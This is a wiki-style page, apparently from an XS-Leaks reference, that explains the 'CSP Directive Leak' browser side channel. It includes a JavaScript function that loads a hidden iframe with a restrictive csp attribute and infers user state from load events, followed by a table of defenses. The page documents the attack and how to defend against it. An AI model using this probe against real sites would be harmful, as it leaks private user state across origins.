+++
title = "CSP leaks"
description = ""
category = "Attack"
abuse = [
    "CSP Violations",
]
defenses = [
    "SameSite Cookies"
]
menu = "main"
weight = 2
+++

## CSP Directive Leak

Without using the `Allow-CSP-From` header an embedder is not allowed to set a more restrictive policy on to an iframe,
For most directives so by trying to apply `img-src 'https://example.com';` to the iframe csp attribute it will refuse to load unless it’s only allowing images from that source this can be detected with the onload event. [Run demo](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

This can be abused if csp attrbutes are set conditionally on user state and embedding is allowed.

```javascript
async function ifResticts(URL, csp) {
    return new Promise((r) => {
        let f = document.createElement('iframe');
        f.setAttribute('csp', csp);
        f.hidden = true;
        f.src = URL;
        f.onload = () => {
            f.onload = () => {
                f.remove();
                return r(0);
            }
            f.src = URL + '#';
        }
        let t = setTimeout(() => {
            f.remove();
            return r(1);
        }, 2000);
        document.body.append(f);
    });
}
```
{{< hint info >}}
As of November 2021, Firefox doesn't support the csp attribute for an [iframe](https://developer.mozilla.org/en-US/docs/Web/API/HTMLIFrameElement/csp).
{{< /hint >}}


## Defense

| [SameSite Cookies (Lax)]({{< ref "/docs/defenses/opt-in/same-site-cookies.md" >}}) | [COOP]({{< ref "/docs/defenses/opt-in/coop.md" >}}) | [Framing Protections]({{< ref "/docs/defenses/opt-in/xfo.md" >}}) |                                          [Isolation Policies]({{< ref "/docs/defenses/isolation-policies" >}})                                           |
| :--------------------------------------------------------------------------------: | :-------------------------------------------------: | :---------------------------------------------------------------: | :------------------------------------------------------------------------------------------------------------------------------------------------------: |
|                                         ✔️                                         |                         ❌                          |                                ✔️                                 | [RIP]({{< ref "/docs/defenses/isolation-policies/resource-isolation" >}}) 🔗 [NIP]({{< ref "/docs/defenses/isolation-policies/navigation-isolation" >}}) |
